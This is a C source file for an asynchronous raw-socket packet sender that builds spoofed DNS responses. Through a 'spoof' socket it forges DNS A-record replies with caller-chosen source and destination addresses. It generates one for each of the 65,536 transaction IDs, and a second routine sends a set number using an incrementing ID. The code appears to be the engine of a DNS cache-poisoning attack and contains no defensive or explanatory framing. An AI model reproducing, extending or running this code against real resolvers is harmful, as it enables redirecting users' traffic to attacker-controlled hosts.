/*
    Utils help functions for sending DNS packets
*/

#include "sender.h"

/*
    Free Single Packet
*/

static void free_packet(packet_t* packet) {
    if (!packet) return;
    if (packet->data) {
        free(packet->data);
        packet->data = NULL;
    }
    free(packet);
}

/*
    Gracefully Stop the UV Loop
*/
static void on_stop(uv_async_t* handle) {
    sender_t* sender = (sender_t*)handle->data;

    printf("\n[Async CB] Graceful shutdown initiated for sender.\n");
    if (sender->is_running) {
        sender_stop(sender);
    }
    uv_stop(sender->loop);
}

/*
    Help Clean the handle
*/
static void on_handle_free(uv_handle_t* handle) {
    free(handle);
}

/*
    Check if to Stop
*/

static void sender_check_stop(uv_timer_t* timer) {
    sender_t* sender = (sender_t*)timer->data;
    if (sender->stop_func && sender->stop_func(sender->state)) {
        printf("[Timer] Stop condition met, stopping sender.\n");
        uv_async_send(sender->stop_async);
        uv_timer_stop(timer);
    }
}

ssize_t default_send(sender_t* sender, packet_t* packet, void* send_args) {
    (void)send_args;
    if (!sender || !packet || !packet->data || packet->size == 0) {
        return BROKEN_ERROR;
    }
    ssize_t sent = sendto(sender->sockfd, packet->data, packet->size, 0,
                          (struct sockaddr*)&sender->addr, sizeof(sender->addr));
    if (sent < 0) {
        perror("sendto");
        return -1; // Error
    }
    return sent; // Return number of bytes sent
}


bool default_make(packet_queue_t* queue, void* args) {
    if (!queue || !args) return false;

    default_make_args_t* d_args = (default_make_args_t*)args;
    printf("Building 65536 packets for %s -> %s (query: %s)\n", d_args->src_ip, d_args->dst_ip, d_args->domain_name);

    // 1. Create a template DNS response payload.
    struct dns_query* query[1];
    struct dns_answer* answer[1];
    
    query[0] = new_dns_query_a(d_args->domain_name);
    answer[0] = new_dns_answer_a(d_args->domain_name, inet_addr("8.8.8.8"), 3600);

    uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, NULL, 0, FALSE);

    uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                            inet_addr(d_args->src_ip), inet_addr(d_args->dst_ip),
                                            d_args->src_port, // Source port for DNS response
                                            d_args->dst_port, // Destination port
                                            dns_payload, dns_payload_len);

    free(dns_payload);
    free_dns_query(query[0]);
    free_dns_answer(answer[0]);

    // 3. Loop 65536 times, create a packet for each TXID, and add to the queue.
    for (uint32_t i = 0; i <= UINT16_MAX; i++) {
        // Create a new packet container
        packet_t* new_pkt = (packet_t*)alloc_memory(sizeof(packet_t));
        new_pkt->data = (uint8_t*)alloc_memory(packet_raw_len);
        new_pkt->size = packet_raw_len;
        new_pkt->next = NULL;

        // Copy the template
        memcpy(new_pkt->data, packet_template, packet_raw_len);

        // ** Modify the TXID **
        struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
        dnsh->id = htons((uint16_t)i);
        if (queue->head == NULL) {
            queue->head = new_pkt;
            queue->tail = new_pkt;
        } else {
            queue->tail->next = new_pkt;
            queue->tail = new_pkt;
        }
    }
    free(packet_template);
    return true;
}

void default_free(packet_queue_t* queue) {
    if (!queue) return;
    packet_t* current = queue->head;
    while (current) {
        packet_t* next = current->next;
        free_packet(current);
        current = next;
    }
    queue->head = NULL;
    queue->tail = NULL;
    free(queue);
}

bool default_init(packet_queue_t** queue_ptr) {
    if (!queue_ptr) return false;
    if (!(*queue_ptr)) {
        *queue_ptr = (packet_queue_t*)malloc(sizeof(packet_queue_t));
        if (!(*queue_ptr)) return false;
        (*queue_ptr)->head = NULL;
        (*queue_ptr)->tail = NULL;
    }
    return true;
}

void default_build_work_cb(uv_work_t* req) {
    packet_work_t* work = (packet_work_t*)req;
    sender_t* sender = work->sender_handle;
    
    // Get the strategy data which holds the function pointers
    default_strategy_data_t* s_data = (default_strategy_data_t*)sender->strategy->data;

    if (!s_data->free_func || !s_data->init_func || !s_data->make_func) {
        fprintf(stderr, "Missing necessary function pointers in strategy data.\n");
        work->error_code = BROKEN_ERROR;
        return;
    }

    if (!s_data->init_func(&work->queue)) {
        fprintf(stderr, "Failed to initialize packet queue.\n");
        work->error_code = INIT_ERROR;
        return;
    }
    
    // Use the functions and args from the strategy data
    if (!s_data->make_func(work->queue, s_data->packet_args)) {
        fprintf(stderr, "Failed to make packet.\n");
        work->error_code = MAKE_ERROR;
        s_data->free_func(work->queue); // Clean up the failed attempt
        work->queue = NULL; // Ensure queue is NULL on error
        return;
    }
    work->error_code = NOERROR;
}

void default_after_work_cb(uv_work_t* req, int status) {
    packet_work_t* work = (packet_work_t*)req;
    sender_t* sender = work->sender_handle;
    default_strategy_data_t* s_data = (default_strategy_data_t*)sender->strategy->data;

    if (status == UV_ECANCELED) {
        fprintf(stderr, "Work request was cancelled.\n");
        if (work->queue) {
            // Get the free function from the strategy to clean up
            s_data->free_func(work->queue);
        }
        free(work);
        return;
    }

    if (work->error_code != NOERROR) {
        fprintf(stderr, "Packet work failed with error code: %d\n", work->error_code);
        // Note: Cleanup should have already happened in the worker thread on MAKE_ERROR
        free(work);
        uv_async_send(sender->stop_async); // Stop the sender on error
        return;
    }

    if (work->queue) {
        sender_add_to_queue(work->sender_handle, work->queue);
        // The sender_add_to_queue now owns the packets. We just free the container.
        free(work->queue); 
    } else {
        #ifdef _DEBUG
        printf("default_after_work_cb: no packets were generated to send.\n");
        #endif
    }

    free(work);
}

void sender_add_to_queue(sender_t* sender, packet_queue_t* packet_queue) {
    if (!packet_queue || !packet_queue->head) {
        return;
    }
    packet_queue_t* queue = (packet_queue_t*)sender->send_queue;
    
    // Find the tail of the new batch
    packet_t* batch_tail = packet_queue->tail;

    if (queue->tail) {
        queue->tail->next = packet_queue->head;
    } else {
        // Queue is empty, this batch is the new head
        queue->head = packet_queue->head;
    }
    // The tail of the queue is now the tail of the new batch
    queue->tail = batch_tail;

    // Start polling for writability if not already doing so
    if (sender->is_running && !(uv_is_active((uv_handle_t*)sender->poll_handle))) {
        uv_poll_start(sender->poll_handle, UV_WRITABLE, sender_poll_cb);
    }
}

void sender_poll_cb(uv_poll_t* handle, int status, int events) {
    sender_t* sender = (sender_t*)handle->data;
    packet_queue_t* queue = (packet_queue_t*)sender->send_queue;

    if (status < 0) {
        fprintf(stderr, "Poll error: %s\n", uv_strerror(status));
        return;
    }

    if (events & UV_WRITABLE) {
        while (queue->head) {
            packet_t* packet = queue->head;
            ssize_t sent = sender->strategy->send_func(sender, packet, sender->strategy->send_args);
            if (sent < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    break;
                } else {
#ifdef _DEBUG
                    printf("sender_poll_cb: unexpected error: %d\n", errno);
#endif
                    perror("sendto");
                }
            }
            
            queue->head = packet->next;
            if (queue->head == NULL) {
                queue->tail = NULL;
            }
            packet->next = NULL; // Decouple from chain before freeing
            free_packet(packet);
        }
        if (queue->head == NULL) {
            uv_poll_stop(sender->poll_handle);
        }
    }
}

int sender_init(
    sender_t* sender, 
    uv_loop_t* loop, 
    const char* ip, 
    int port
) {
    if (!sender || !loop || !ip) return INIT_ERROR;

    memset(sender, 0, sizeof(sender_t));
    sender->loop = loop;

    // Create raw socket
    sender->sockfd = make_sockfd_for_spoof();

    // Make socket non-blocking
    int flags = fcntl(sender->sockfd, F_GETFL, 0);
    if (flags < 0) {
        perror("fcntl(F_GETFL)");
        close(sender->sockfd);
        return INIT_ERROR;
    }
    if (fcntl(sender->sockfd, F_SETFL, flags | O_NONBLOCK) < 0) {
        perror("fcntl(F_SETFL)");
        close(sender->sockfd);
        return INIT_ERROR;
    }
    
    // Create Sending Queue
    packet_queue_t* queue = (packet_queue_t*)malloc(sizeof(packet_queue_t));
    if (!queue) {
        close(sender->sockfd);
        return INIT_ERROR;
    }
    queue->head = NULL;
    queue->tail = NULL;
    sender->send_queue = queue;

    // Create Poll Handle Used for Socket
    sender->poll_handle = (uv_poll_t*)malloc(sizeof(uv_poll_t));
    if (!sender->poll_handle) {
        free(queue);
        close(sender->sockfd);
        return INIT_ERROR;
    }
    uv_poll_init_socket(loop, sender->poll_handle, sender->sockfd);
    sender->poll_handle->data = sender; // Link back to sender
    
    // Create Sockaddr_in 
    uv_ip4_addr(ip, port, &sender->addr);

    // Create Stop Async for Stop
    sender->stop_async = (uv_async_t*)malloc(sizeof(uv_async_t));
    if (!sender->stop_async) {
        free(sender->poll_handle);
        free(queue);
        close(sender->sockfd);
        return INIT_ERROR;
    }
    uv_async_init(loop, sender->stop_async, on_stop);
    sender->stop_async->data = sender;
    uv_unref((uv_handle_t*)sender->stop_async); // don't care much about the background-handle

    // Set Stop Condition to NULL !!!
    // if needed, please run sender_set_stop_cond()
    sender->stop_timer = NULL;
    sender->stop_func = NULL;
    sender->state = NULL;
    sender->free_func = NULL;

    // Set sender Not Running !!!
    sender->is_running = false;
    return 0;
}


void sender_free(sender_t* sender) {
    if (!sender) return;

    if (sender->strategy) {
        sender_stop(sender); 
        if (sender->strategy->free_send_args_func && sender->strategy->send_args) {
            sender->strategy->free_send_args_func(sender->strategy->send_args);
        }
        sender->strategy->free_data(sender->strategy->data);
        free(sender->strategy);
        sender->strategy = NULL;
    }

    // Stop timer
    if (sender->stop_timer) {
        if (uv_is_active((uv_handle_t*)sender->stop_timer)) {
            uv_timer_stop(sender->stop_timer);
        }
        if (!uv_is_closing((uv_handle_t*)sender->stop_timer)) {
            uv_close((uv_handle_t*)sender->stop_timer, on_handle_free);
        }
        sender->stop_timer = NULL;
    }

    // Free Stop Timer Data
    if (sender->free_func && sender->state) {
        sender->free_func(sender->state);
        sender->state = NULL;
        sender->free_func = NULL;
    }

    // Stop polling if it's active
    if (uv_is_active((uv_handle_t*)sender->poll_handle)) {
        uv_poll_stop(sender->poll_handle);
    }
    if (!uv_is_closing((uv_handle_t*)sender->poll_handle)) {
        uv_close((uv_handle_t*)sender->poll_handle, on_handle_free);
    }
    // Ensure we close it properly. uv_close is async.
    if (sender->stop_async && !uv_is_closing((uv_handle_t*)sender->stop_async)) {
        uv_close((uv_handle_t*)sender->stop_async, on_handle_free);
    }
    default_free((packet_queue_t*)sender->send_queue);

    close(sender->sockfd);
}

void sender_start(sender_t* sender) {
    if (!sender || !sender->strategy || sender->is_running) {
#ifdef _DEBUG
        printf("sender_start: fail to start");
        if (!sender) {
            printf(", for no sender\n");
        }
        if (!sender->strategy) {
            printf(", for no strategy\n");
        }
        if (sender->is_running) {
            printf(", for is running\n");
        }
#endif
        return;
    }
    sender->is_running = true;
    sender->strategy->start(sender, sender->strategy->data);
}

void sender_stop(sender_t* sender) {
    if (!sender || !sender->strategy || !sender->is_running) {
#ifdef _DEBUG
        printf("sender_stop: fail to stop");
        if (!sender) {
            printf(", for no sender\n");
        }
        if (!sender->strategy) {
            printf(", for no strategy\n");
        }
        if (!sender->is_running) {
            printf(", for not running\n");
        }
#endif
        return;
    }
    sender->strategy->stop(sender, sender->strategy->data);
    sender->is_running = false;
}


int sender_set_strategy(sender_t* sender, sender_strategy_t* strategy) {
    if (!sender || !strategy) return BROKEN_ERROR;
    
    if (sender->strategy) {
        if (sender->is_running) {
            sender_stop(sender); // Stop before freeing
        }
        sender->strategy->free_data(sender->strategy->data);
        free(sender->strategy);
    }
    
    sender->strategy = strategy;
    return NOERROR;
}

int sender_set_stop_cond(
    sender_t *sender,
    stop_func stop_func,
    void *state,
    free_func free_func,
    uint64_t interval // MilliSeconds
) {
    if (!sender || !stop_func) {
#ifdef _DEBUG
        printf("sender_set_stop_cond: error");
        if (!sender) {
            printf(" ,for no sender\n");
        }
        if (!stop_func) {
            printf(" ,for no stop_func\n");
        }
#endif
        return BROKEN_ERROR;
    }

    // Check if stop timer exists
    if (sender->stop_timer) {
        uv_timer_stop(sender->stop_timer);
        uv_close((uv_handle_t*)sender->stop_timer, on_handle_free);
        
        if (sender->free_func && sender->state) {
            sender->free_func(sender->state);
        }
    }

    // Re-alloc for stop timer
    sender->stop_timer = (uv_timer_t*)malloc(sizeof(uv_timer_t));
    if (!sender->stop_timer) {
        return INIT_ERROR;
    }

    // Init stop timer
    uv_timer_init(sender->loop, sender->stop_timer);

    // Save stop condition callback and state
    sender->stop_func = stop_func;
    sender->state = state;
    sender->free_func = free_func;

    // Attach sender as data to the timer for access in the callback
    sender->stop_timer->data = sender;

    // Start stop timer
    uv_timer_start(sender->stop_timer, sender_check_stop, interval, interval);

    return NOERROR;
}


/*
    More Specified Functions
*/

bool pps_make(packet_queue_t* queue, void* args) {
    if (!queue || !args) return false;

    default_make_args_t* d_args = (default_make_args_t*)args;

    // 1. Create a template DNS response payload.
    struct dns_query* query[1];
    struct dns_answer* answer[1];
    
    query[0] = new_dns_query_a(d_args->domain_name);
    answer[0] = new_dns_answer_a(d_args->domain_name, inet_addr("8.8.8.8"), 3600);

    uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, NULL, 0, FALSE);

    uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                            inet_addr(d_args->src_ip), inet_addr(d_args->dst_ip),
                                            d_args->src_port,
                                            d_args->dst_port,
                                            dns_payload, dns_payload_len);
    free(dns_payload);
    free_dns_query(query[0]);
    free_dns_answer(answer[0]);

    // 2. Loop `packets_to_generate` times, using the shared counter for TXID.
    for (size_t i = 0; i < ((pps_make_args_t*)d_args)->count; i++) {
        packet_t* new_pkt = (packet_t*)alloc_memory(sizeof(packet_t));
        new_pkt->data = (uint8_t*)alloc_memory(packet_raw_len);
        new_pkt->size = packet_raw_len;
        new_pkt->next = NULL;

        memcpy(new_pkt->data, packet_template, packet_raw_len);

        // ** Modify the TXID using the shared, incrementing counter **
        struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
        dnsh->id = htons(get_tx_id());

        if (queue->head == NULL) {
            queue->head = new_pkt;
            queue->tail = new_pkt;
        } else {
            queue->tail->next = new_pkt;
            queue->tail = new_pkt;
        }
    }
    
    free(packet_template);
    return true;
}